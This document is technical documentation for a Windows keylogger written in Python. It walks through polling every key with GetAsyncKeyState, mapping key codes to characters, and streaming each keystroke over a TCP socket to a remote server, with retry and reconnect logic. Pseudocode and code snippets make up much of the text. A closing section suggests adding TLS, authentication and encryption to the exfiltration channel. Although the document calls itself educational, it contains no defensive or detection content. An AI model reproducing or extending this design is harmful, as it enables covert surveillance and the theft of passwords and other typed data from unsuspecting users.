# Keylogger - Technical Documentation & Working Mechanism

## Table of Contents
1. [Architecture Overview](#architecture-overview)
2. [Core Components](#core-components)
3. [Function-by-Function Analysis](#function-by-function-analysis)
4. [Data Flow](#data-flow)
5. [Windows API Integration](#windows-api-integration)
6. [Network Protocol](#network-protocol)
7. [State Management](#state-management)
8. [Error Handling Strategy](#error-handling-strategy)

---

## Architecture Overview

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     KEYLOGGER CLIENT                         │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────┐      ┌──────────────┐      ┌───────────┐ │
│  │   Config     │─────▶│   Network    │─────▶│  Server   │ │
│  │   Loader     │      │   Manager    │      │ (Remote)  │ │
│  └──────────────┘      └──────────────┘      └───────────┘ │
│         │                      ▲                             │
│         │                      │                             │
│         ▼                      │                             │
│  ┌──────────────┐      ┌──────────────┐                    │
│  │   Keyboard   │─────▶│     Key      │                    │
│  │   Monitor    │      │   Processor  │                    │
│  └──────────────┘      └──────────────┘                    │
│         │                      │                             │
│         │                      │                             │
│         ▼                      ▼                             │
│  ┌──────────────────────────────────┐                      │
│  │      Windows API (user32.dll)     │                      │
│  │  - GetAsyncKeyState()             │                      │
│  │  - GetKeyState()                  │                      │
│  └──────────────────────────────────┘                      │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Component Interaction Flow

```
[Start] → [Load Config] → [Connect to Server] → [Main Loop]
                                    │
                                    ▼
                          ┌─────────────────┐
                          │  Poll Keyboard  │
                          │  (256 keys)     │
                          └─────────────────┘
                                    │
                    ┌───────────────┼───────────────┐
                    ▼               ▼               ▼
            [Key Pressed?]  [Shift State]  [Caps Lock]
                    │               │               │
                    └───────────────┴───────────────┘
                                    │
                                    ▼
                          ┌─────────────────┐
                          │  Process Key    │
                          │  Apply Logic    │
                          └─────────────────┘
                                    │
                                    ▼
                          ┌─────────────────┐
                          │  Send to Server │
                          └─────────────────┘
                                    │
                    ┌───────────────┴───────────────┐
                    ▼                               ▼
            [Success] → [Continue]      [Fail] → [Reconnect]
```

---

## Core Components

### 1. Configuration System
- **Purpose**: Manage runtime parameters
- **Storage**: JSON file (`config.json`)
- **Fallback**: Default configuration dictionary

### 2. Network Manager
- **Protocol**: TCP/IP
- **Socket Type**: SOCK_STREAM (reliable, connection-oriented)
- **Encoding**: UTF-8

### 3. Keyboard Monitor
- **API**: Windows user32.dll
- **Polling Rate**: 10ms (configurable)
- **Key Range**: 0-255 (all virtual key codes)

### 4. Key Processor
- **Input**: Virtual key code + modifier states
- **Output**: Human-readable character
- **Logic**: Shift + Caps Lock XOR operation

### 5. State Manager
- **Tracking**: Key press/release states
- **Purpose**: Prevent duplicate key events
- **Storage**: Dictionary (key_code → boolean)

---

## Function-by-Function Analysis

### 1. `load_config()`

**Purpose**: Load configuration from file or create default

**Algorithm**:
```python
def load_config():
    1. Check if config.json exists
    2. If exists:
        a. Try to load JSON
        b. Merge with defaults (defaults take precedence for missing keys)
        c. Return merged config
    3. If not exists or load fails:
        a. Use DEFAULT_CONFIG
        b. Try to create config.json with defaults
        c. Return DEFAULT_CONFIG
```

**Return Value**: Dictionary with configuration parameters

**Error Handling**:
- JSON parse errors → Use defaults + log warning
- File write errors → Continue with defaults + log warning

**Example Flow**:
```
config.json exists? 
    ├─ YES → Parse JSON → Merge with defaults → Return
    └─ NO  → Use defaults → Create file → Return defaults
```

---

### 2. `get_key(code, shift_pressed=False)`

**Purpose**: Convert virtual key code to readable character

**Parameters**:
- `code` (str): Virtual key code as string (e.g., "65" for 'A')
- `shift_pressed` (bool): Whether Shift key is currently pressed

**Algorithm**:
```python
def get_key(code, shift_pressed):
    1. Check if shift_pressed AND code has shift mapping
        → Return shift_table[code] (e.g., "1" → "!")
    2. Else:
        → Return ascii_table.get(code, "")
    3. If KeyError:
        → Return empty string
```

**Data Structures**:

**ascii_table** (Base mappings):
```python
{
    "65": "A",  # Letter keys (uppercase by default)
    "48": "0",  # Number keys
    "32": " ",  # Space
    "13": "[ENTER]",  # Special keys
    ...
}
```

**shift_table** (Shift combinations):
```python
{
    "49": "!",  # Shift+1 = !
    "50": "@",  # Shift+2 = @
    "186": ":", # Shift+; = :
    ...
}
```

**Example Execution**:
```
Input: code="49", shift_pressed=True
    → Check shift_table["49"] → Returns "!"

Input: code="49", shift_pressed=False
    → Check ascii_table["49"] → Returns "1"

Input: code="65", shift_pressed=False
    → Check ascii_table["65"] → Returns "A"
```

---

### 3. `is_shift_pressed()`

**Purpose**: Detect if either Shift key is currently pressed

**Windows API Calls**:
```python
user32.GetAsyncKeyState(VK_LSHIFT) & KEY_PRESSED
user32.GetAsyncKeyState(VK_RSHIFT) & KEY_PRESSED
```

**Algorithm**:
```python
def is_shift_pressed():
    1. Call GetAsyncKeyState(VK_LSHIFT) → Get left shift state
    2. Bitwise AND with KEY_PRESSED (0x8000)
    3. Call GetAsyncKeyState(VK_RSHIFT) → Get right shift state
    4. Bitwise AND with KEY_PRESSED (0x8000)
    5. Return: (left_shift != 0) OR (right_shift != 0)
```

**Bit Masking Explanation**:
```
GetAsyncKeyState returns 16-bit value:
    Bit 15 (0x8000): Currently pressed
    Bit 0 (0x0001): Toggled since last call

KEY_PRESSED = 0x8000 = 1000 0000 0000 0000 (binary)

Example:
    Key pressed:     1000 0000 0000 0001
    & KEY_PRESSED:   1000 0000 0000 0000
    Result:          1000 0000 0000 0000 (non-zero = True)

    Key released:    0000 0000 0000 0001
    & KEY_PRESSED:   1000 0000 0000 0000
    Result:          0000 0000 0000 0000 (zero = False)
```

**Return Value**: Boolean (True if either Shift is pressed)

---

### 4. `is_caps_lock_on()`

**Purpose**: Detect if Caps Lock is currently toggled ON

**Windows API Call**:
```python
user32.GetKeyState(VK_CAPITAL) & CAPS_LOCK_ON
```

**Algorithm**:
```python
def is_caps_lock_on():
    1. Call GetKeyState(VK_CAPITAL) → Get Caps Lock state
    2. Bitwise AND with CAPS_LOCK_ON (0x0001)
    3. Return: (result != 0)
```

**Difference from GetAsyncKeyState**:
- `GetKeyState`: Returns toggle state (for Caps Lock, Num Lock, Scroll Lock)
- `GetAsyncKeyState`: Returns current press state

**Bit Masking**:
```
CAPS_LOCK_ON = 0x0001 = 0000 0000 0000 0001 (binary)

Caps Lock ON:    0000 0000 0000 0001
& CAPS_LOCK_ON:  0000 0000 0000 0001
Result:          0000 0000 0000 0001 (non-zero = True)

Caps Lock OFF:   0000 0000 0000 0000
& CAPS_LOCK_ON:  0000 0000 0000 0001
Result:          0000 0000 0000 0000 (zero = False)
```

**Return Value**: Boolean (True if Caps Lock is ON)

---

### 5. `apply_case_logic(key, shift_pressed, caps_lock_on)`

**Purpose**: Apply proper uppercase/lowercase logic based on modifier keys

**Algorithm**:
```python
def apply_case_logic(key, shift_pressed, caps_lock_on):
    1. Check if key is single alphabetic character
        → If not: Return key unchanged
    2. Apply XOR logic:
        → If (shift_pressed XOR caps_lock_on):
            → Return key.upper()
        → Else:
            → Return key.lower()
```

**XOR Truth Table**:
```
Shift | Caps Lock | XOR Result | Output
------|-----------|------------|--------
  0   |     0     |     0      | lowercase
  0   |     1     |     1      | UPPERCASE
  1   |     0     |     1      | UPPERCASE
  1   |     1     |     0      | lowercase
```

**Example Scenarios**:
```
Input: key="A", shift=False, caps=False
    → XOR: False ^ False = False
    → Output: "a"

Input: key="A", shift=True, caps=False
    → XOR: True ^ False = True
    → Output: "A"

Input: key="A", shift=False, caps=True
    → XOR: False ^ True = True
    → Output: "A"

Input: key="A", shift=True, caps=True
    → XOR: True ^ True = False
    → Output: "a" (both cancel out)
```

**Why XOR?**
- Caps Lock inverts the default case
- Shift also inverts the default case
- When both are active, they cancel each other out
- XOR perfectly captures this behavior

---

### 6. `connect_to_server(config)`

**Purpose**: Establish TCP connection with retry logic

**Parameters**:
- `config` (dict): Configuration dictionary

**Algorithm**:
```python
def connect_to_server(config):
    1. Extract server_address, server_port, max_attempts, delay
    2. For attempt in range(1, max_attempts + 1):
        a. Create new socket: socket.socket(AF_INET, SOCK_STREAM)
        b. Set timeout: socket.settimeout(10)
        c. Try to connect: socket.connect((address, port))
        d. If success:
            → Log success
            → Return socket
        e. If socket.error:
            → Log error
            → If not last attempt:
                → Sleep for delay seconds
                → Continue to next attempt
            → If last attempt:
                → Log max attempts reached
                → Return None
        f. If other exception:
            → Log unexpected error
            → Return None
    3. Return None (if loop completes without success)
```

**State Diagram**:
```
[Start] → [Attempt 1]
              │
              ├─ Success → [Return Socket]
              │
              └─ Fail → [Wait 5s] → [Attempt 2]
                                        │
                                        ├─ Success → [Return Socket]
                                        │
                                        └─ Fail → [Wait 5s] → ... → [Attempt 10]
                                                                          │
                                                                          └─ Fail → [Return None]
```

**Timeout Behavior**:
- Socket timeout: 10 seconds
- If server doesn't respond within 10s → socket.timeout exception
- Treated as connection failure → retry

**Return Value**: 
- `socket` object on success
- `None` on failure

---

### 7. `send_keystroke(client_socket, key)`

**Purpose**: Send keystroke to server with error handling

**Parameters**:
- `client_socket`: Socket object (or None)
- `key` (str): Character to send

**Algorithm**:
```python
def send_keystroke(client_socket, key):
    1. Check if client_socket is None:
        → Return False
    2. Try:
        a. Check if key is non-empty:
            → Encode key to UTF-8: key.encode('utf-8')
            → Send via socket: client_socket.sendall(encoded_key)
            → Return True
        b. If key is empty:
            → Return True (nothing to send)
    3. Except socket.error:
        → Log error
        → Return False
    4. Except other exceptions:
        → Log unexpected error
        → Return False
```

**UTF-8 Encoding**:
```python
"A".encode('utf-8') → b'A' (1 byte)
"!".encode('utf-8') → b'!' (1 byte)
"[ENTER]".encode('utf-8') → b'[ENTER]' (7 bytes)
```

**sendall() vs send()**:
- `sendall()`: Blocks until all data is sent (or error occurs)
- `send()`: May send partial data, requires loop to ensure all data sent
- We use `sendall()` for reliability

**Return Value**: Boolean
- `True`: Successfully sent (or nothing to send)
- `False`: Error occurred

---

### 8. `main()`

**Purpose**: Main execution loop - orchestrates all components

**Algorithm**:
```python
def main():
    1. Initialize:
        a. Log startup
        b. Load configuration
        c. Connect to server (exit if fails)
        d. Initialize key_states dictionary
    
    2. Main Loop (infinite):
        a. Get current modifier states:
            → shift_pressed = is_shift_pressed()
            → caps_lock_on = is_caps_lock_on()
        
        b. For each key code (0-255):
            i. Check if key is pressed:
                → GetAsyncKeyState(i) & KEY_PRESSED
            
            ii. If pressed AND not previously pressed:
                → Mark as pressed: key_states[i] = True
                → Get key character: get_key(str(i), shift_pressed)
                → Apply case logic: apply_case_logic(key, shift, caps)
                → Send to server: send_keystroke(socket, key)
                → If send fails:
                    → Close socket
                    → Reconnect
                    → If reconnect fails: Exit
            
            iii. If not pressed:
                → Mark as not pressed: key_states[i] = False
        
        c. Sleep for poll_interval (default 10ms)
    
    3. Exception Handling:
        a. KeyboardInterrupt (Ctrl+C):
            → Log shutdown
            → Break loop
        b. Other exceptions:
            → Log error
            → Sleep 1 second
            → Continue loop
    
    4. Cleanup (finally):
        a. Close socket
        b. Log shutdown
```

**Key State Tracking**:
```python
key_states = {
    65: False,  # 'A' key not pressed
    66: False,  # 'B' key not pressed
    ...
}

# When 'A' is pressed:
key_states[65] = True  # Mark as pressed
# Process and send 'A'

# On next iteration, if 'A' still pressed:
# key_states[65] is already True → Skip (prevent duplicate)

# When 'A' is released:
key_states[65] = False  # Mark as not pressed
```

**Why Track State?**
- `GetAsyncKeyState()` returns current state, not events
- Without tracking, holding a key would send it every 10ms
- State tracking ensures we only send on key press, not hold

---

## Data Flow

### Complete Keystroke Journey

```
1. USER PRESSES KEY
   └─▶ Physical keyboard signal

2. WINDOWS OS
   └─▶ Generates virtual key code (e.g., 65 for 'A')

3. KEYLOGGER POLLS (every 10ms)
   └─▶ GetAsyncKeyState(65) → Returns 0x8000 (pressed)

4. STATE CHECK
   └─▶ key_states[65] == False? (not previously pressed)
       └─▶ YES → Continue processing
       └─▶ NO → Skip (already processed)

5. MODIFIER STATE CHECK
   ├─▶ is_shift_pressed() → False
   └─▶ is_caps_lock_on() → False

6. KEY MAPPING
   └─▶ get_key("65", shift_pressed=False)
       └─▶ Returns "A" from ascii_table

7. CASE LOGIC
   └─▶ apply_case_logic("A", shift=False, caps=False)
       └─▶ XOR: False ^ False = False
       └─▶ Returns "a" (lowercase)

8. ENCODING
   └─▶ "a".encode('utf-8') → b'a'

9. NETWORK TRANSMISSION
   └─▶ socket.sendall(b'a')
       └─▶ TCP packet sent to server

10. SERVER RECEIVES
    └─▶ Decodes UTF-8 → Displays "a"

11. STATE UPDATE
    └─▶ key_states[65] = True (mark as processed)

12. USER RELEASES KEY
    └─▶ GetAsyncKeyState(65) → Returns 0x0000 (not pressed)
    └─▶ key_states[65] = False (ready for next press)
```

---

## Windows API Integration

### Virtual Key Codes

**Standard Keys**:
```
0x08 (8)   - Backspace
0x09 (9)   - Tab
0x0D (13)  - Enter
0x10 (16)  - Shift
0x11 (17)  - Ctrl
0x12 (18)  - Alt
0x14 (20)  - Caps Lock
0x1B (27)  - Escape
0x20 (32)  - Space
0x30-0x39  - Number keys 0-9
0x41-0x5A  - Letter keys A-Z
0x60-0x69  - Numpad 0-9
0x70-0x7B  - F1-F12
0xA0 (160) - Left Shift
0xA1 (161) - Right Shift
```

### API Functions Used

#### 1. `GetAsyncKeyState(vKey)`

**Purpose**: Get current state of a key

**Prototype**:
```c
SHORT GetAsyncKeyState(int vKey);
```

**Return Value** (16-bit):
```
Bit 15 (0x8000): Key is currently pressed
Bit 0  (0x0001): Key was pressed since last call
Bits 1-14: Reserved
```

**Usage in Code**:
```python
state = user32.GetAsyncKeyState(65)  # Check 'A' key
if state & 0x8000:  # Check bit 15
    print("'A' is currently pressed")
```

**Why Async?**
- Checks key state at the moment of call
- Doesn't wait for Windows message queue
- Can detect keys even if window doesn't have focus

#### 2. `GetKeyState(vKey)`

**Purpose**: Get toggle state of a key

**Prototype**:
```c
SHORT GetKeyState(int vKey);
```

**Return Value** (16-bit):
```
Bit 0 (0x0001): Key is toggled ON (for Caps Lock, Num Lock, Scroll Lock)
Bit 15 (0x8000): Key is currently pressed
```

**Usage in Code**:
```python
state = user32.GetKeyState(0x14)  # Check Caps Lock
if state & 0x0001:  # Check bit 0
    print("Caps Lock is ON")
```

**Difference from GetAsyncKeyState**:
- `GetKeyState`: Synchronized with message queue, returns toggle state
- `GetAsyncKeyState`: Asynchronous, returns current physical state

---

## Network Protocol

### TCP Connection

**Socket Configuration**:
```python
socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```

**Parameters**:
- `AF_INET`: IPv4 address family
- `SOCK_STREAM`: TCP (connection-oriented, reliable)

**Connection Process**:
```
Client                          Server
  │                               │
  ├─── SYN ──────────────────────▶│
  │                               │
  │◀────── SYN-ACK ───────────────┤
  │                               │
  ├─── ACK ──────────────────────▶│
  │                               │
  │    [Connection Established]   │
  │                               │
  ├─── Data (keystroke) ─────────▶│
  ├─── Data (keystroke) ─────────▶│
  ├─── Data (keystroke) ─────────▶│
  │                               │
```

### Data Format

**Encoding**: UTF-8

**Packet Structure**:
```
┌─────────────────────────────────┐
│  UTF-8 Encoded Character(s)     │
│  Variable length: 1-7 bytes     │
└─────────────────────────────────┘
```

**Examples**:
```
Character: "a"
Encoded:   0x61 (1 byte)

Character: "[ENTER]"
Encoded:   0x5B 0x45 0x4E 0x54 0x45 0x52 0x5D (7 bytes)

Character: "!"
Encoded:   0x21 (1 byte)
```

**No Framing Protocol**:
- Each keystroke sent immediately
- No message boundaries
- Server must handle streaming data

---

## State Management

### Key State Dictionary

**Structure**:
```python
key_states = {
    0: False,    # Key code 0
    1: False,    # Key code 1 (Left mouse button)
    ...
    65: False,   # 'A' key
    ...
    255: False   # Key code 255
}
```

**State Transitions**:
```
Initial State: key_states[65] = False

User presses 'A':
    GetAsyncKeyState(65) & 0x8000 → True
    key_states[65] == False → Process key
    key_states[65] = True

Next iteration (key still pressed):
    GetAsyncKeyState(65) & 0x8000 → True
    key_states[65] == True → Skip (already processed)

User releases 'A':
    GetAsyncKeyState(65) & 0x8000 → False
    key_states[65] = False

User presses 'A' again:
    GetAsyncKeyState(65) & 0x8000 → True
    key_states[65] == False → Process key
    key_states[65] = True
```

**Memory Usage**:
```
256 keys × 1 byte (boolean) = 256 bytes
Negligible memory footprint
```

---

## Error Handling Strategy

### Layered Error Handling

```
┌─────────────────────────────────────────┐
│         Application Layer               │
│  - Graceful shutdown on Ctrl+C          │
│  - Log all errors                       │
└─────────────────────────────────────────┘
              │
┌─────────────────────────────────────────┐
│         Network Layer                   │
│  - Connection retry logic               │
│  - Automatic reconnection               │
│  - Socket cleanup                       │
└─────────────────────────────────────────┘
              │
┌─────────────────────────────────────────┐
│         Function Layer                  │
│  - Try-except in each function          │
│  - Return None/False on error           │
│  - Log specific errors                  │
└─────────────────────────────────────────┘
```

### Error Categories

**1. Configuration Errors**:
```python
try:
    config = json.load(f)
except json.JSONDecodeError:
    logger.warning("Invalid JSON, using defaults")
    config = DEFAULT_CONFIG
```

**2. Network Errors**:
```python
try:
    socket.connect((address, port))
except socket.timeout:
    logger.error("Connection timeout")
    # Retry logic
except socket.error as e:
    logger.error(f"Socket error: {e}")
    # Retry logic
```

**3. Runtime Errors**:
```python
try:
    # Main loop
except KeyboardInterrupt:
    logger.info("Shutdown requested")
    # Graceful exit
except Exception as e:
    logger.error(f"Unexpected error: {e}")
    # Continue or exit based on severity
```

**4. Resource Cleanup**:
```python
try:
    # Main execution
finally:
    if socket:
        socket.close()
    logger.info("Cleanup complete")
```

---

## Performance Characteristics

### CPU Usage

**Polling Loop**:
- 256 key checks per iteration
- 100 iterations per second (10ms interval)
- ~25,600 API calls per second

**Optimization**:
- Efficient bitwise operations
- Minimal string operations
- Direct API calls (no Python overhead)

**Typical CPU Usage**: 1-3% on modern systems

### Memory Usage

**Static Allocation**:
- key_states dictionary: ~256 bytes
- Configuration: ~1 KB
- Logging buffers: ~10 KB

**Dynamic Allocation**:
- Socket buffers: ~8 KB
- String operations: Minimal (single characters)

**Total Memory**: < 1 MB

### Network Bandwidth

**Per Keystroke**:
- Average: 1-2 bytes (single character)
- Maximum: 15 bytes (special keys like "[SCROLLLOCK]")

**Typical Usage**:
- 60 WPM typing = ~5 characters/second
- Bandwidth: ~5-10 bytes/second
- Negligible network impact

---

## Security Analysis

### Vulnerabilities

**1. Plaintext Transmission**:
```
Attacker can intercept:
    Client ──[a][b][c]──▶ [ATTACKER] ──[a][b][c]──▶ Server
```

**2. No Authentication**:
```
Anyone can connect to server:
    Legitimate Client ──▶ Server
    Malicious Client  ──▶ Server (accepted)
```

**3. No Integrity Checking**:
```
Data can be modified in transit:
    Client ──[password]──▶ [ATTACKER] ──[modified]──▶ Server
```

### Mitigation Strategies

**1. Add SSL/TLS**:
```python
import ssl
context = ssl.create_default_context()
secure_socket = context.wrap_socket(socket, server_hostname='server.com')
```

**2. Add Authentication**:
```python
# Send authentication token
auth_token = "secret_key_12345"
socket.sendall(auth_token.encode())
# Server validates before accepting data
```

**3. Add Encryption**:
```python
from cryptography.fernet import Fernet
cipher = Fernet(key)
encrypted = cipher.encrypt(data.encode())
socket.sendall(encrypted)
```

---

## Conclusion

This keylogger demonstrates:
- **Windows API integration** for low-level keyboard access
- **State management** for event detection
- **Network programming** with error handling
- **Proper case logic** using XOR operations
- **Modular design** with clear separation of concerns

The implementation is educational and shows proper software engineering practices including error handling, logging, configuration management, and resource cleanup.
